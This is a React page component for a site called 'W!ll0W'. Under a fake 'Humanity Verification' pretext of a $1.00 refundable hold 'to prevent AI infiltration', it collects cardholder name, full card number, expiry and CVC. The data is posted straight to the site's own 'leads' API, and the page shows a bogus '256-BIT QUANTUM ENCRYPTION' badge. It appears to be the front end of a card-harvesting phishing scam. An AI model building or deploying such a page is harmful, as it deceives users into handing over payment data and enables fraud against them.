import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation, useSearch } from "wouter";
import { Navbar } from "@/components/Navbar";
import { CyberInput } from "@/components/CyberInput";
import { CyberButton } from "@/components/CyberButton";
import { useVerifyPayment } from "@/hooks/use-leads";
import { api } from "@shared/routes";
import { motion } from "framer-motion";
import { CreditCard, Calendar, Lock, UserCheck, ShieldAlert } from "lucide-react";

// Use payment schema from shared routes
const formSchema = api.leads.verifyPayment.input;
type FormData = z.infer<typeof formSchema>;

export default function Verification() {
  const [location, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const leadId = Number(params.get("id"));

  const { mutate: verifyPayment, isPending } = useVerifyPayment();
  const [isSuccess, setIsSuccess] = useState(false);
  
  const form = useForm<FormData>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      cardHolder: "",
      cardNumber: "",
      expiryDate: "",
      cvc: ""
    }
  });

  // Redirect if no ID provided
  useEffect(() => {
    if (!leadId) {
      setLocation("/signup");
    }
  }, [leadId, setLocation]);

  const onSubmit = (data: FormData) => {
    if (!leadId) return;

    verifyPayment(
      { id: leadId, ...data },
      {
        onSuccess: () => {
          setIsSuccess(true);
        }
      }
    );
  };

  if (isSuccess) {
    return <SuccessView />;
  }

  return (
    <div className="min-h-screen bg-background relative flex flex-col">
      <Navbar />
      
      {/* Warning Grid Background */}
      <div className="absolute inset-0 bg-[linear-gradient(rgba(6,182,212,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(6,182,212,0.03)_1px,transparent_1px)] bg-[size:30px_30px] pointer-events-none" />
      
      <main className="flex-grow container mx-auto px-6 pt-32 pb-20 flex justify-center items-center">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-lg"
        >
          {/* Warning Banner */}
          <div className="mb-8 border border-secondary/30 bg-secondary/10 p-4 rounded flex items-start gap-4">
            <ShieldAlert className="w-6 h-6 text-secondary shrink-0 mt-1" />
            <div>
              <h3 className="font-display font-bold text-secondary text-lg">Humanity Verification Required</h3>
              <p className="text-sm text-secondary/80 mt-1">
                To prevent AI infiltration, a <span className="font-bold text-white">$1.00 USD</span> hold will be placed to verify your biological signature. This is instantly refunded.
              </p>
            </div>
          </div>

          {/* Payment Form */}
          <div className="glass-panel p-8 relative overflow-hidden">
             {/* Scanning line animation */}
             <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-secondary to-transparent opacity-50 animate-[scan_3s_linear_infinite]" />

            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
              
              <CyberInput
                label="Authorized Name"
                placeholder="NAME ON CARD"
                icon={<UserCheck className="w-4 h-4" />}
                error={form.formState.errors.cardHolder?.message}
                {...form.register("cardHolder")}
              />

              <div className="space-y-2">
                <CyberInput
                  label="Access Key (Card Number)"
                  placeholder="0000 0000 0000 0000"
                  icon={<CreditCard className="w-4 h-4" />}
                  maxLength={19}
                  error={form.formState.errors.cardNumber?.message}
                  {...form.register("cardNumber")}
                />
                <div className="flex gap-2 justify-end">
                   {/* Valid card icons placeholder */}
                   <div className="w-8 h-5 bg-white/10 rounded" />
                   <div className="w-8 h-5 bg-white/10 rounded" />
                   <div className="w-8 h-5 bg-white/10 rounded" />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-6">
                <CyberInput
                  label="Validity (MM/YY)"
                  placeholder="MM/YY"
                  icon={<Calendar className="w-4 h-4" />}
                  maxLength={5}
                  error={form.formState.errors.expiryDate?.message}
                  {...form.register("expiryDate")}
                />
                <CyberInput
                  label="Security Code (CVC)"
                  placeholder="123"
                  type="password"
                  maxLength={4}
                  icon={<Lock className="w-4 h-4" />}
                  error={form.formState.errors.cvc?.message}
                  {...form.register("cvc")}
                />
              </div>

              <div className="pt-6">
                <CyberButton 
                  type="submit" 
                  className="w-full"
                  variant="secondary"
                  isLoading={isPending}
                >
                  Verify Humanity ($1.00)
                </CyberButton>
                <div className="flex justify-center items-center gap-2 mt-4 text-xs text-muted-foreground">
                  <Lock className="w-3 h-3" />
                  <span className="font-mono uppercase">256-BIT QUANTUM ENCRYPTION ACTIVE</span>
                </div>
              </div>
            </form>
          </div>
        </motion.div>
      </main>
    </div>
  );
}

function SuccessView() {
  const [, setLocation] = useLocation();

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center p-6 text-center">
       {/* Background */}
       <div className="absolute inset-0 quantum-grid opacity-10 pointer-events-none" />

       <motion.div
        initial={{ scale: 0.8, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ type: "spring", duration: 0.8 }}
        className="relative z-10"
       >
         <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-8 relative">
           <div className="absolute inset-0 border-2 border-green-500 rounded-full animate-ping opacity-20" />
           <ShieldAlert className="w-12 h-12 text-green-400" />
         </div>

         <h1 className="text-4xl md:text-5xl font-display font-bold text-white mb-4 text-glow-cyan">
           VERIFICATION COMPLETE
         </h1>
         
         <p className="text-xl text-muted-foreground mb-8 max-w-lg mx-auto">
           Biological signature confirmed. Welcome to W!ll0W, the future of financial intelligence.
         </p>

         <div className="p-6 border border-white/10 bg-white/5 rounded-lg max-w-md mx-auto mb-8 font-mono text-sm text-left space-y-2">
           <div className="flex justify-between">
             <span className="text-muted-foreground">STATUS:</span>
             <span className="text-green-400">AUTHORIZED</span>
           </div>
           <div className="flex justify-between">
             <span className="text-muted-foreground">ACCESS LEVEL:</span>
             <span className="text-white">LEVEL 1 (INITIATE)</span>
           </div>
           <div className="flex justify-between">
             <span className="text-muted-foreground">HOLD RELEASED:</span>
             <span className="text-white">PENDING (24HRS)</span>
           </div>
         </div>

         <CyberButton onClick={() => setLocation("/")}>
           Enter Dashboard
         </CyberButton>
       </motion.div>
    </div>
  );
}
